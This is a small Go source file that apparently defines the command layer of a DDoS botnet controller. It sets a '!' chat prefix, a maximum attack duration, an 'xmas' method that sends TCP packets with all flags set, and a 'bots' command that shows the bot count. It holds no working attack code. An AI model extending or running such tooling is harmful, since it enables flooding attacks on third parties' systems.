package domain

// [prefix][command]
//
// example
//
// !xmas [args]
const PREFIX = "!"
const MAX_DURATION = 1024 // in seconds

type Method struct {
	Name        string // without prefix
	Description string
}

type Command struct {
	Name        string
	Description string
	// TODO: change
	Handler func(args []string)
}

var MethodsMap = map[uint8]Method{
	0: {
		Name:        "xmas",
		Description: "sends TCP packets with all flags set",
	},
}

var CommandsMap = map[uint8]Command{
	0: {
		Name:        "bots",
		Description: "shows bot count",
	},
}
